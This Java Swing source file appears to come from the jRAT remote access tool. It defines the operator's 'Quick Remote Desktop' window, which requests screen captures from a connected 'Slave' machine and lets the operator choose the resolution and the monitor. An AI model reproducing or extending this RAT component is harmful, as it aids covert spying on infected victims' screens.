package pro.jrat.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import javax.swing.ButtonGroup;
import javax.swing.ImageIcon;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;

import pro.jrat.Monitor;
import pro.jrat.Slave;
import pro.jrat.packets.outgoing.Packet98QuickDesktop;
import pro.jrat.threads.ThreadFPS;

@SuppressWarnings("serial")
public class FrameQuickRemoteScreen extends BaseFrame {

	public static final HashMap<Slave, FrameQuickRemoteScreen> instances = new HashMap<Slave, FrameQuickRemoteScreen>();

	private Slave slave;
	private JPanel contentPane;
	private JLabel label;
	private ImageIcon icon;
	private BufferedImage image;
	private JScrollPane scrollPane;
	private JMenu mnActions;
	private JMenuItem mntmStart;
	private JMenuItem mntmStop;
	private JMenuItem mntmSetResolution;
	private JMenu mnMonitor;
	private List<JCheckBoxMenuItem> monitors = new ArrayList<JCheckBoxMenuItem>();
	private ThreadFPS thread = new ThreadFPS() {
		@Override
		public void onUpdate(int fps) {
			lblFPS.setText("  FPS: " + fps);
		}
	};
	private JLabel lblFPS;
	private JLabel lblSize;

	public BufferedImage getImage() {
		return image;
	}

	public JLabel getLabel() {
		return label;
	}

	public FrameQuickRemoteScreen(Slave sl) {
		thread.start();
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameQuickRemoteScreen.class.getResource("/icons/quick_remote_desktop.png")));
		this.slave = sl;
		instances.put(sl, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				thread.stopRunning();
				instances.remove(slave);
			}
		});
		setTitle("Quick Remote Desktop - " + slave.getIP() + " - " + slave.getComputerName());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);

		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);

		mnActions = new JMenu("Actions");
		menuBar.add(mnActions);

		mntmStart = new JMenuItem("Start");
		mntmStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				mntmStop.setEnabled(true);
				mntmStart.setEnabled(false);
				send();
			}
		});
		mnActions.add(mntmStart);

		mntmStop = new JMenuItem("Stop");
		mntmStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				mntmStop.setEnabled(false);
				mntmStart.setEnabled(true);
			}
		});
		mntmStop.setEnabled(false);
		mnActions.add(mntmStop);

		mnActions.addSeparator();

		mntmSetResolution = new JMenuItem("Set resolution");
		mntmSetResolution.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String result = JOptionPane.showInputDialog(null, "Enter resolution. Example: 320x240", "Resolution", JOptionPane.QUESTION_MESSAGE);

				try {
					if (result != null && result.contains("x")) {
						String[] args = result.split("x");

						int width = Integer.parseInt(args[0]);
						int height = Integer.parseInt(args[1]);

						update(width, height);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
		mnActions.add(mntmSetResolution);

		mnMonitor = new JMenu("Monitor");
		menuBar.add(mnMonitor);

		ButtonGroup b = new ButtonGroup();

		JCheckBoxMenuItem item = new JCheckBoxMenuItem("Default");
		b.add(item);
		mnMonitor.add(item);
		item.setSelected(true);
		monitors.add(item);

		lblFPS = new JLabel("  FPS:");
		menuBar.add(lblFPS);

		lblSize = new JLabel("    Size:");
		menuBar.add(lblSize);

		for (Monitor monitor : slave.getMonitors()) {
			item = new JCheckBoxMenuItem(monitor.getName());
			b.add(item);
			item.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {

				}
			});
			mnMonitor.add(item);
			monitors.add(item);
		}

		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);

		scrollPane = new JScrollPane();
		contentPane.add(scrollPane, BorderLayout.CENTER);

		update(480, 320);
	}

	public void update(int w, int h) {
		image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);
		icon = new ImageIcon(image);
		label = new JLabel(icon);
		scrollPane.setViewportView(label);
	}

	public int getMonitor() {
		for (int i = 0; i < monitors.size(); i++) {
			if (monitors.get(i).isSelected()) {
				return i - 1;
			}
		}
		return -1;
	}

	public void setSize(int kb) {
		lblSize.setText("  Size: " + kb + " kb");
	}

	public boolean shouldContinue() {
		return mntmStop.isEnabled();
	}

	public void send() {
		slave.addToSendQueue(new Packet98QuickDesktop(image.getWidth(), image.getHeight(), getMonitor()));
	}

	public ThreadFPS getFPSThread() {
		return thread;
	}
}
